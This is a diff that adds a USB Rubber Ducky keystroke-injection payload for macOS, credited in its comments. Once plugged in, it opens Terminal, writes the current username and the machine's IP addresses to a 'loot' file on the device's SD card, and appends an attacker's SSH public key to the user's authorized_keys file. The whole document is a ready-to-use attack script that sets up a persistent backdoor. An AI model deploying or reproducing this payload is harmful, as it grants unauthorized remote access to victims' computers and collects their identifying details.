@@ -1,0 +1,41 @@
+REM Author: Domenico Malorni (lilloX)
+REM This script adds the public ssh key of your attacker computer to the
+REM authorized_keys file in the computers ~/.ssh directory.
+REM The Rubber Ducky must to have the Twin Ducky firmware flashed (aka composite firmware)
+REM The payload will wait the mount of the SD, then write in the SD the IP(s) address(es)
+REM and place the public key in the authorized_keys file
+DELAY 1000
+COMMAND SPACE
+DELAY 800
+STRING Terminal
+DELAY 500
+ENTER
+DELAY 500
+REM Wait for the sd being monted
+STRING while true; do
+ENTER
+STRING mount | grep "on /Volumes/DUCKY" > /dev/null
+ENTER
+STRING if [ $? -eq 0 ]; then break; fi
+ENTER
+STRING done
+ENTER
+REM Write to the SD the IP(s) and the username
+STRING touch /Volumes/DUCKY/loot
+ENTER
+STRING whoami >> /Volumes/DUCKY/loot
+ENTER
+STRING ifconfig|grep inet|grep -v "127.0.0.1"|grep -v inet6|awk '{ print $2 }' >> /Volumes/DUCKY/loot
+ENTER
+REM If it not exists, create the .ssh directory and the authorized_keys file
+STRING mkdir -p $HOME/.ssh
+ENTER
+STRING touch $HOME/.ssh/authorized_keys
+ENTER
+STRING cat /Volumes/DUCKY/ducky_macos_ssh.pub >> $HOME/.ssh/authorized_keys
+ENTER
+DELAY 250
+STRING diskutil unmount /Volumes/DUCKY
+ENTER
+DELAY 800
+ENTER
